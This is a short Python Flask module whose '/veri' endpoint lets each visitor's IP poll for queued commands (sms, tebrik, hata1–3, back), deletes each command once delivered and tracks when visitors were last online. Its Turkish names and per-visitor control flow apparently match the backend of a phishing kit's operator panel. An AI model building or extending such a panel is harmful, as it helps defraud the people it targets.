from __future__ import annotations

from flask import Blueprint, Response, request

from ..database import get_cursor
from ..utils import delete_command, get_client_ip, reset_back_flag, update_last_online

commands_bp = Blueprint("commands", __name__)

COMMAND_TABLES = [
    ("sms", "sms", "sms"),
    ("tebrik", "tebrik", "tebrik"),
    ("hata1", "hata1", "hata1"),
    ("hata2", "hata2", "hata2"),
    ("hata3", "hata3", "hata3"),
    ("back", "back", "back"),
]


@commands_bp.route("/veri", methods=["GET", "POST"])
def poll_data() -> Response:
    client_ip = request.args.get("ip") or get_client_ip(request)
    query_id = request.args.get("queryId")
    if query_id:
        try:
            query_id = int(query_id)
        except ValueError:
            query_id = None
    else:
        query_id = None

    if not client_ip:
        return Response("", status=204)

    for table_name, column, payload in COMMAND_TABLES:
        with get_cursor() as cursor:
            cursor.execute(f"SELECT {column} FROM {table_name} WHERE {column}=? LIMIT 1", (client_ip,))
            row = cursor.fetchone()
        if row:
            delete_command(table_name, column, client_ip)
            if table_name == "back":
                reset_back_flag(query_id)
            return Response(payload, mimetype="text/plain")

    update_last_online(query_id, client_ip)
    return Response("", status=204)
